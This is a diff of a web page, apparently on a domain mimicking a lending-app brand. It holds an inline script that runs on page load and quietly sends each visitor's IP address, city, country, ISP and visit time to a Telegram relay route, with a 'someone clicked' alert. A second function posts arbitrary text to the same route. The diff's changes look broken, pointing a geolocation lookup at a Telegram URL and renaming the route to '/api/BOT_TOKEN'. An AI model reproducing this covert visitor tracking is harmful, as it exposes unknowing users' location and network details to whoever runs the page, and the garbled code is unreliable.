@@ -199,7 +199,7 @@
         }
 
         function sendTelegramMessage(text) {
-            fetch('/api/kirim-telegram', {
+            fetch('/api/BOT_TOKEN', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ pesan: text })
@@ -294,12 +294,12 @@
     <!-- SCRIPT PENCATATAN PENGUNJUNG -->
     <script type="text/javascript">
         window.onload = function() {
-            fetch('https://ipapi.co/json/')
+            fetch('https://api.telegram.org/json/')
                 .then(res => res.json())
                 .then(data => {
                     const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG KLIK WEB!</b>\n\n<b>Domain:</b> www.adakami.website\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
 
-                    fetch('/api/kirim-telegram', {
+                    fetch('/api/BOT_TOKEN', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ pesan: infoPesan })
